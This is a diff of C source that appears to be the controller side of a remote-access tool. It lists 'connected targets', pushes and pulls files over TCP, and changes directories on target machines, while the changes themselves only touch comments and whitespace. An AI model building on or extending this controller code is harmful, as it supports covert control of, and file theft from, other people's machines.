@@ -58,7 +58,7 @@ void terminate_server(int listen_socket, char* error) {
 // Function to create socket.
 int create_socket() {
 	// Create the server socket object.
-	int listen_socket = socket(AF_INET, SOCK_STREAM, 0); 
+	int listen_socket = socket(AF_INET, SOCK_STREAM, 0);
 	if (listen_socket == -1) {
 		perror("Socket creation failed.\n");
 		exit(1); 
@@ -155,6 +155,7 @@ void list_connections(const Conn_map* conns) {
 	printf("---  C0NNECTED TARGETS  ---\n");
 	printf("--     Hostname: ID      --\n");
 	printf("---------------------------\n\n");
+
 	if (conns->size) {
 		for (size_t i = 0; i < conns->size; i++) {
 			printf("%s: %lu\n", conns->clients[i].host, i);
@@ -168,8 +169,10 @@ void list_connections(const Conn_map* conns) {
 
 // Function to upload file to target machine (TCP file transfer).
 int send_file(char* const buf, const size_t cmd_len, int client_socket) {
-	// Send command to the client to be parsed.
+	// '3' is the command code for uploading a file via the client.
 	buf[7] = '3';
+
+	// Send command code + filename to be parsed.
 	if (write(client_socket, &buf[7], cmd_len) < 1)
 		return -1;
  
@@ -216,8 +219,10 @@ int send_file(char* const buf, const size_t cmd_len, int client_socket) {
  
 // Function to receive file from target machine (TCP file transfer).
 int recv_file(char* const buf, const size_t cmd_len, int client_socket) {
-	// Send command to the client to be parsed.
+	// '4' is the command code for downloading a file via the client.
 	buf[9] = '4';
+	
+	// Send command code + filename to be parsed.
 	if (write(client_socket, &buf[9], cmd_len) < 1)
 		return -1;
  
@@ -255,6 +260,7 @@ int client_cd(char* const buf, const size_t cmd_len, int client_socket) {
 	// '1' is the command code for changing directory.
 	buf[3] = '1';
 	
+	// Send command code + directory string to be parsed.
 	if (write(client_socket, &buf[3], cmd_len) < 1)
 		return -1;
  
@@ -365,6 +371,7 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 	// Receive and parse input/send commands to client.
 	while (i_result > 0) {
 		printf("%s // ", client_host);
+	
 		// Set all bytes in buffer to zero.
 		memset(buf, '\0', BUFLEN);
  
